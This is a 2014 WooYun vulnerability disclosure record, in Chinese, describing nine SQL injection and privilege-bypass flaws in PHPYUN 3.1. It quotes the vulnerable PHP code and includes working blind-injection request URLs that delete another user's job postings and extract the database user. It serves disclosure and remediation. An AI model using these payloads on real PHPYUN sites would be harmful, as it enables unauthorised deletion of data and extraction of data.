{"id": 1521, "wybug_id": "wooyun-2014-064323", "wybug_title": "PHPYUN最新版多处SQL注入及越权操作", "wybug_corp": "php云人才系统", "wybug_author": "xfkxfk", "wybug_date": "2014-06-10 14:26", "wybug_open_date": "2014-09-08 14:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向公众公开  简要描述： PHPYUN最新版（phpyun_v3.1.0604_gbk）多处SQL注入及越权操作这里一共存在九处SQL注入及越权操作！！！ 详细说明：  这里一共存在九处SQL注入及越权操作！！！文件/member/model/com.class.php第一处SQL注入、越权删除职位信息：\nfunction job(){......if($_GET['del'] || is_array($_POST['checkboxid'])){\t\t\tif(is_array($_POST['checkboxid'])){\t\t\t\t$layer_type=1;\t\t\t\t$delid=@implode(\",\",$_POST['checkboxid']);\t\t\t}else if($_GET['del']){\t\t\t\t$layer_type=0;\t\t\t\t$delid=$_GET['del'];\t\t\t}\t\t\t$nid=$this->obj->DB_delete_all(\"company_job\",\"`id` in (\".$delid.\") and `uid`='\".$this->uid.\"'\",\" \");\t\t\tif($nid){\t\t\t\t$rows=$this->obj->DB_select_all(\"company_job\",\"`id` in (\".$delid.\") and `r_status`<>'2'\",\"`state`\");\t\t\t\tif(is_array($rows)){\t\t\t\t\t$status0=$status1=$status2=$status3=0;\t\t\t\t\tforeach($rows as $v){\t\t\t\t\t\tif($v['state']==\"0\"){\t\t\t\t\t\t\t$status0=$status0+1;\t\t\t\t\t\t}elseif($v['state']==\"1\"){\t\t\t\t\t\t\t$status1=$status1+1;\t\t\t\t\t\t}elseif($v['state']==\"2\"){\t\t\t\t\t\t\t$status2=$status2+1;\t\t\t\t\t\t}elseif($v['state']==\"3\"){\t\t\t\t\t\t\t$status3=$status3+1;\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\t$num=count($rows);\t\t\t\t\t$value.=\"`status0`=`status0`-$status0,\";\t\t\t\t\t$value.=\"`status1`=`status1`-$status1,\";\t\t\t\t\t$value.=\"`status2`=`status2`-$status2,\";\t\t\t\t\t$value.=\"`status3`=`status3`-$status3,\";\t\t\t\t\t$value.=\"`job`=`job`-$num\";\t\t\t\t\t$this->obj->DB_update_all(\"company_statis\",$value,\"uid='\".$this->uid.\"'\");\t\t\t\t}\t\t\t\t$newest=$this->obj->DB_select_once(\"company_job\",\"`uid`='\".$this->uid.\"' order by lastupdate DESC\",\"`lastupdate`\");\t\t\t\t$this->obj->update_once(\"company\",array(\"jobtime\"=>$newest['lastupdate']),array(\"uid\"=>$this->uid));\t\t\t\t$this->layer_msg('删除成功！',9,$layer_type,$_SERVER['HTTP_REFERER']);\t\t\t}else{$this->layer_msg('删除失败！',8,$layer_type,$_SERVER['HTTP_REFERER']);}\t\t}\n这里的$delid=$_GET['del'];没有经过任何保护直接进入：DB_delete_all和DB_select_all跟进DB_delete_all函数：\nfunction DB_delete_all($tablename, $where, $limit = 'limit 1'){\t \t$SQL = \"DELETE FROM `\" . $this->def . $tablename . \"` WHERE $where $limit\";\t\t$this->db->query(\"set `sql_mode`=''\");\t\treturn $this->db->query($SQL);\n这里也没有处理，导致SQL注入而且这里可以通过截断后面的：and `uid`='\".$this->uid.\"'\"，修改uid的值，uid为用户的用户id，这样就可以越权操作，删除任意用户的职位信息了。第二处SQL注入、越权删除用户系统信息：\nfunction sysnews_action(){\t\tif ($_POST['del']||$_GET['del']){\t\t\tif(is_array($_POST['del'])){\t\t\t\t$ids=@implode(',',$_POST['del']);\t\t\t\t$layer_type='1';\t\t\t}else if($_GET['del']){\t\t\t\t$ids=$_GET['del'];\t\t\t\t$layer_type='0';\t\t\t}\t\t\t$nid=$this->obj->DB_delete_all(\"sysmsg\",\"`id` in(\".$ids.\") AND `fa_uid`='\".$this->uid.\"'\",\" \");\t\t\t$nid?$this->layer_msg('删除成功！',9,$layer_type):$this->layer_msg('删除失败！',8,$layer_type);\t\t}\t\t$urlarr=array(\"c\"=>\"sysnews\",\"page\"=>\"{{page}}\");\t\t$pageurl=$this->url(\"index\",\"index\",$urlarr);\t\t$this->get_page(\"sysmsg\",\"`fa_uid`='\".$this->uid.\"' order by id desc\",$pageurl,\"10\");\t\t$this->public_action();\t\t$this->yunset(\"js_def\",7);\t\t$this->com_tpl('sysnews');\t}\n这里的$ids=$_GET['del'];没有经过任何保护进入了DB_delete_all函数，导致SQL注入由于这里的fa_uid就是此用户的uder id，这里我们通过截断后面的fa_uid，修改fa_uid为任意用户的id，就可以通过越权操作，删除任意用户的系统信息了。第三、四、五、六处SQL注入、越权操作：\nfunction hr_action()\t{\t\tif($_POST['ajax']==1 && $_POST['ids'])\t\t{\t\t\t$this->obj->DB_update_all(\"userid_job\",\"`is_browse`='2'\",\"`id` in (\".@implode(\",\",$_POST['ids']).\") and `com_id`='\".$this->uid.\"'\");die;//第三处ids存在注入；\t\t}\t\tif($_POST['delid']||$_GET['delid']){\t\t\tif(is_array($_POST['delid'])){\t\t\t\t$id=@implode(\",\",$_POST['delid']);\t\t\t\t$layer_type='1';\t\t\t}else{\t\t\t\t$id=$_GET['delid'];\t\t\t\t$layer_type='0';\t\t\t}\t\t\t$sq_num = $this->obj->DB_select_all(\"userid_job\",\"`id` in (\".$id.\") and `com_id`='\".$this->uid.\"'\",\"`uid`\");//第四处id=delid存在注入；\t\t\tif(is_array($sq_num)){\t\t\t\tforeach($sq_num as $v){\t\t\t\t\t$a[]=$v['uid'];\t\t    \t}\t\t\t}\t\t\t$user_id=@implode(\",\",$a);\t\t\t$data['sq_jobnum']=\"`sq_jobnum`\"-count($sq_num);\t\t\t$this->obj->update_once(\"member_statis\",$data,\"uid in (\".$user_id.\")\");\t\t\t$nid=$this->obj->DB_delete_all(\"userid_job\",\"`id` in (\".$id.\") and `com_id`='\".$this->uid.\"'\",\" \");//第五处这里的id也存在注入;\t\t\t$nid?$this->layer_msg('删除成功！',9,$layer_type,\"index.php?c=hr\"):$this->layer_msg('删除失败！',8,$layer_type,\"index.php?c=hr\");\t\t}\t\tif(!empty($_GET['keyword'])){\t\t\t$rows=$this->obj->DB_select_all(\"resume\",\"`name` like '%\".$_GET['keyword'].\"%' and `r_status`<>'2'\",\"`uid`\");\t\t\tif(is_array($rows) && !empty($rows)){\t\t\t\tforeach($rows as $v){\t\t\t\t\t$uidarr[]=$v['uid'];\t\t\t\t}\t\t\t\t$urlarr['keyword']=$_GET['keyword'];\t\t\t\t$where=\" uid in (\".@implode(',',$uidarr).\") and \";\t\t\t}\t\t}\t\tif($_GET['job_id']){\t\t\t$where =\"job_id=\".$_GET['job_id'].\" and \";\t\t\t$urlarr['job_id']=$_GET['job_id'];\t\t}\t\t$this->public_action();\t\t$urlarr['c']=\"hr\";\t\t$urlarr['page']=\"{{page}}\";\t\t$pageurl=$this->url(\"index\",\"index\",$urlarr);\t\t$rows=$this->get_page(\"userid_job\",$where.\"  `com_id`='\".$this->uid.\"'\",$pageurl,\"10\");//第六处这里的job_id进入where存在注入\t\tif(is_array($rows) && !empty($rows))\t\t{\t\t\tforeach($rows as $v)\t\t\t{\t\t\t\t$uid[]=$v['uid'];\t\t\t}\t\t\t$userrows=$this->obj->DB_select_all(\"resume\",\"`uid` in (\".@implode(\",\",$uid).\") and `r_status`<>'2'\",\"`name`,`sex`,`edu`,`uid`\");\t\t\tif(is_array($userrows))\t\t\t{\t\t\t\tinclude(PLUS_PATH.\"user.cache.php\");\t\t\t\tforeach($rows as $k=>$v)\t\t\t\t{\t\t\t\t\tforeach($userrows as $val)\t\t\t\t\t{\t\t\t\t\t\tif($v['uid']==$val['uid'])\t\t\t\t\t\t{\t\t\t\t\t\t\t$rows[$k]['name']=$val['name'];\t\t\t\t\t\t\t$rows[$k]['sex']=$userclass_name[$val['sex']];\t\t\t\t\t\t\t$rows[$k]['edu']=$userclass_name[$val['edu']];\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\t$this->yunset(\"rows\",$rows);\t\t$this->company_satic();\t\t$this->yunset(\"js_def\",5);\t\t$this->com_tpl('hr');\t}\n上面的注入点都已经表名，见后面的漏洞证明，证明漏洞存在第七处SQL注入、越权删除黑名单\nfunction blacklist_action()\t{\t\tif($_POST['delid']){\t\t\tif(is_array($_POST['delid'])){\t\t\t\t$id=@implode(\",\",$_POST['delid']);\t\t\t\t$layer_type='1';\t\t\t}else{\t\t\t\t$layer_type='0';\t\t\t}\t\t\t$id=@implode(\",\",$_POST['delid']);\t\t\t$nid=$this->obj->DB_delete_all(\"blacklist\",\"`id` in (\".$id.\") and `c_uid`='\".$this->uid.\"'\",\" \");\t\t\t$nid?$this->layer_msg('删除成功！',9,$layer_type,\"index.php?c=blacklist\"):$this->layer_msg('删除失败！',8,$layer_type,\"index.php?c=blacklist\");\t\t}\n这里的$id=@implode(\",\",$_POST['delid']);没有经过保护直接进入了DB_delete_all，导致SQL注入，通过截断，修改uid可以删除任意用户的黑名单信息。第八处SQL注入、越权删除用户邀请信息\nfunction invite_action()\t{\t\tif($_POST['delid'] || $_GET['del'])\t\t{\t\t\tif($_GET['del'])\t\t\t{\t\t\t\t$id=$_GET['del'];\t\t\t\t$layer_type='0';\t\t\t}else{\t\t\t\t$id=@implode(\",\",$_POST['delid']);\t\t\t\t$layer_type='1';\t\t\t}\t\t\t$nid=$this->obj->DB_delete_all(\"userid_msg\",\"`id` in (\".$id.\") and `fid`='\".$this->uid.\"'\",\" \");\t\t\t$nid?$this->layer_msg('删除成功！',9,$layer_type,\"index.php?c=invite\"):$this->layer_msg('删除失败！',8,$layer_type,\"index.php?c=invite\");\t\t}\n这里的$id=$_GET['del'];没有经过保护直接进入了DB_delete_all，导致SQL注入，通过截断，修改uid可以删除任意用户的邀请信息。第九处SQL注入、越权操作\nfunction down_action()\t{\t\tif($_POST['delid'] || $_GET['del'])\t\t{\t\t\tif($_GET['del'])\t\t\t{\t\t\t\t$id=$_GET['del'];\t\t\t\t$layer_type='0';\t\t\t}else{\t\t\t\t$id=@implode(\",\",$_POST['delid']);\t\t\t\t$layer_type='1';\t\t\t}\t\t\t$id=$_GET['del']?$_GET['del']:@implode(\",\",$_POST['delid']);\t\t\t$nid=$this->obj->DB_delete_all(\"down_resume\",\"`id` in (\".$id.\") and `comid`='\".$this->uid.\"'\",\" \");\t\t\t$nid?$this->layer_msg('删除成功！',9,$layer_type,\"index.php?c=down\"):$this->layer_msg('删除失败！',8,$layer_type,\"index.php?c=down\");\t\t}\n这里的$id=$_GET['del']?$_GET['del']:@implode(\",\",$_POST['delid']);没有经过保护直接进入了DB_delete_all，导致SQL注入，通过截断，修改uid可以删除任意用户信息。   漏洞证明：  这里拿第一处SQL注入、越权删除职位信息为例：两个企业用户：攻击者：111111，uid=3，发布的职位信息id=2，受害者：222222，uid=4，发布的职位信息id=4，我们先来看看用户222222发布的职位信息：\n\n然后用户111111发送请求：http://localhost/phpyun/member/index.php?c=job&del=if(substring(user(),1,1)=char(111),4,888))/**/and `uid`=4%23将uid设置为受害者222222的uid=4\n\n这然后查看用户222222的发布职位信息，仍然存在，没有删除修改char的值，继续发送请求：http://localhost/phpyun/member/index.php?c=job&del=if(substring(user(),1,1)=char(114),4,888))/**/and `uid`=4%23\n\n此时在访问用户222222的发布职位信息时，职位信息已经被删除：\n\n这列通过修改char的值，遍历得到user（）=root也通过设置uid为其他任意用户，导致越权操作，可删除其他用户的发布职位信息。   修复方案：  过滤，引号保护   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-06-10 14:55 厂商回复： 感谢您的提供，我们会继续完善！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}